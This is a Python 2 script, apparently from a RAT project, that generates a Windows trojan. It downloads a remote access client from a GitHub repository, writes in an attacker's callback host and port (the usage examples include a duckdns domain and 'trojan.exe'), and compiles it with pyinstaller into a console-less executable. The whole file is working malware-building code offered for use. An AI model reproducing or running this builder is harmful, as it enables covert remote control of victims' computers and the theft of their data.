#!/usr/bin/env python2
# -*- coding: utf-8 -*-
#
#

"""
[~] Author : Black Viking
"""

import sys, os, subprocess, urllib2, colorama, shutil

def usage():
	print """
Usage:
----------------------
	python2 generate_exec.py -h 127.0.0.1 -p 8080 -n trojan.exe
	---
	python2 generate_exec.py -h vkng.duckdns.org -p 1604 -n trojan.exe\n"""
	sys.exit()

def get_client(host, port):
	return urllib2.urlopen("https://raw.githubusercontent.com/blackvkng/PyRAT/master/client.py").read().replace("HOST = '127.0.0.1'", "HOST = socket.gethostbyname('%s')"%(host)).replace("PORT = int('8000')", "PORT = int('%s')"%(port))

	
def generate_exec(host, port, source, name):
	print """
[-] Host: %s
[-] Port: %s\n"""%(host, port)
	
	file = open(name.split(".")[0], "w")
	file.write(source)
	file.close()

	cmd = "pyinstaller --onefile --noconsole %s"%(name.split(".")[0])
	os.system(cmd)
	#os.remove(name.split(".")[0]+'.py')
	raw_input("\n\n\n[*] Press Enter to continue...")
	file = "%s%sdist%s%s"%(os.getcwd(), os.sep, os.sep, name)
	if os.path.exists(file) == True:
		os.chdir("..")
		shutil.copy2(file, name)
		shutil.rmtree("exec")
		print "\n[+] Exe file (Windows) ==> %s"%(os.getcwd()+os.sep+name)
	else:
		sys.exit()

def main():
	if len(sys.argv) == 7:
		if os.path.exists("exec") == True:
			os.chdir("exec")
		else:
			os.mkdir("exec")
			os.chdir("exec")

		host = sys.argv[2]	
		port = sys.argv[4]
		name = sys.argv[6]
		
		source = get_client(host, port)

		generate_exec(host, port, source, name)

	else:
		usage()

if __name__ == "__main__":
	main()
